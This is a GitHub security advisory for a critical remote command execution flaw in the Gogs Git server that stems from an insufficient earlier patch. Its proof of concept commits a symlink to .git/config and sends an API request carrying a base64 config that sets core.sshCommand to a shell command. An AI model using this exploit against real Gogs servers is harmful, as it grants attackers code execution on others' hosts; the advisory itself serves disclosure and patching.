# [C] Gogs's update .git/config file allows remote command execution

## Summary
Severity: Critical
Advisory: GHSA-gg64-xxr9-qhjp
CVE: CVE-2025-64111
CWE: CWE-78
Ecosystem: Go
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-02-06
Source: https://github.com/advisories/GHSA-gg64-xxr9-qhjp
Type: github-advisory

## Affected
- Go: `gogs.io/gogs` — affected >=0 <0.13.4

## Details
### Summary
Due to the insufficient patch for the https://github.com/gogs/gogs/security/advisories/GHSA-wj44-9vcg-wjq7, it's still possible to update files in the `.git` directory and achieve remote command execution.

### Details
Function `UpdateRepoFile` security check under some if conditions. While UpdateRepoFile call in API router  will NOT match any of them.  It's still possible to update `.git/config` file via API router.
https://github.com/gogs/gogs/blob/d940e692ec58abd45e648c054d7dfd88909034ec/internal/route/api/v1/repo/contents.go#L197-L206



### PoC
```bash
# add a symlink file and push to repo.
ln -s .git/config link
git add link
git commit -m 'add' && git push
```

Update file via API router
```http
PUT /api/v1/repos/demo/vul/contents/link HTTP/1.1
Content-Type: application/json
Host: localhost:3000
Authorization: token {token}

{"message":"message","committer":{"name":"test","email":"a@b.com"},"content":"W2NvcmVdCglyZXBvc2l0b3J5Zm9ybWF0dmVyc2lvbiA9IDAKCWZpbGVtb2RlID0gdHJ1ZQoJYmFyZSA9IGZhbHNlCglsb2dhbGxyZWZ1cGRhdGVzID0gdHJ1ZQoJaWdub3JlY2FzZSA9IHRydWUKCXByZWNvbXBvc2V1bmljb2RlID0gdHJ1ZQoJc3NoQ29tbWFuZCA9IHRvdWNoIC90bXAvYWJjCltyZW1vdGUgIm9yaWdpbiJdCgl1cmwgPSBzc2g6Ly9naXRAbG9jYWxob3N0L2RlbW8vdnVsLmdpdAoJZmV0Y2ggPSArcmVmcy9oZWFkcy8qOnJlZnMvcmVtb3Rlcy9vcmlnaW4vKgpbYnJhbmNoICJtYXN0ZXIiXQoJcmVtb3RlID0gb3JpZ2luCgltZXJnZSA9IHJlZnMvaGVhZHMvbWFzdGVy"}
```

### Impact
RCE

## References
- https://github.com/gogs/gogs/security/advisories/GHSA-gg64-xxr9-qhjp
- https://nvd.nist.gov/vuln/detail/CVE-2025-64111
- https://github.com/gogs/gogs
- https://github.com/gogs/gogs/blob/d940e692ec58abd45e648c054d7dfd88909034ec/internal/route/api/v1/repo/contents.go#L197-L206
